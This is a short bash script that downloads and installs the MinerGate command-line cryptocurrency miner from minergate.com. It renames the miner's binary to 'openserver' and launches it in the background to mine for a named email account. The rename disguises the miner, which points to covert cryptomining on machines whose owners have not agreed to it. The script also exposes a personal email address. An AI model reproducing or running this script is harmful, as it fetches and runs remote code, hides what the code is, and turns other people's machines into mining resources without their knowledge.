#!/bin/bash
apt-get update
apt-get -y install wget screen && wget https://minergate.com/download/deb-cli
dpkg -i deb-cli
mv /usr/bin/minergate-cli /usr/bin/openserver
openserver -user sintraduciendo@gmail.com -bcn 5 &
